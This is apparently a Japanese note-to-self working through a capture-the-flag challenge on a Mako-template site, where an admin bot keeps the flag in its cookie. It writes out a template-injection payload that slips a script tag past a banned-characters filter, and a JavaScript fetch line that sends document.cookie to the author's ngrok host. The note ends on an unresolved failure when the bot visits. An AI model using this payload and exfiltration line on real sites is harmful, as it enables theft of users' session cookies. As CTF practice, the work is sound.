https://chatgpt.com/c/68b30a41-fc80-8320-a1cc-398c0e885ee9

makoというテンプレートエンジンを使ったサイト。
https://www.makotemplates.org/

文字を入力してそれをファンシーなフォントで表示してくれる。

mako式と呼ばれるものを評価して返してくれることがわかっている。
`${2*2}`とやるとその文字列ではなく、`4`が返ってくる。

コードを見ると、report nameを実行すると、botが起動して、またサイトにname_inputを携えながらアクセスをしてくる。
そのbotはcookieにflagを持っている。

なので、こちらで用意したサイトにjsを仕込んでおいて、それを実行させて、こちらで用意したサイトにcookieを送らせることができれば、flagを取れる。

ngrokとhttp-serverを使う。
jsとしては
```javascript
fetch('https://31f12cf3abcc.ngrok-free.app/hit?c=' + encodeURIComponent(document.cookie)).catch(()=>{});
```

みたいな感じ。

----
入力を工夫して該当のサイトのjsを実行させたい。
bannedな文字列を回避するには下記のようにする

```text
${banned[1]+'SCRIPT SRC=//31f12cf3abcc%2Engrok-free%2Eapp/x%2EJS'+banned[2]+banned[1]+'/SCRIPT'+banned[2]}
```

これでやると、自分で打ち込んだ時は届くのだが、botからのアクセス時には失敗する(通信が届かない)。
それはbotがquery paramから取得した値を quote 処理しているからと思われる。

